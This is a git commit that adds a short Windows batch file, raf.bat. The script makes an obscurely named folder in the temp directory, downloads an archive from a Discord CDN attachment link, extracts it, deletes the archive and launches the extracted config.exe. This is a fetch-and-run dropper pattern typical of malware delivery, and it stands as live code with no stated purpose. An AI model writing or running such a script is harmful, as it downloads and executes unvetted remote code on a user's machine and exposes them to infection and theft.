d669b4d4af8420acb4276f9cd56499149613f250
Henry-Hart <78500214+Henry-Hart@users.noreply.github.com>
2022-03-16 12:55:23 +0000

    Create raf.bat

---
+++ raf.bat
@@ -0,0 +1,8 @@
+cd %temp%
+mkdir config_273o2o27w82
+cd config_273o2o27w82
+C:\Windows\System32\curl -O cdn.discordapp.com/attachments/939631401555337239/953573113789046844/config
+C:\Windows\System32\tar -xf config
+del config
+cmd /c start %temp%\config_273o2o27w82\config.exe
+pause
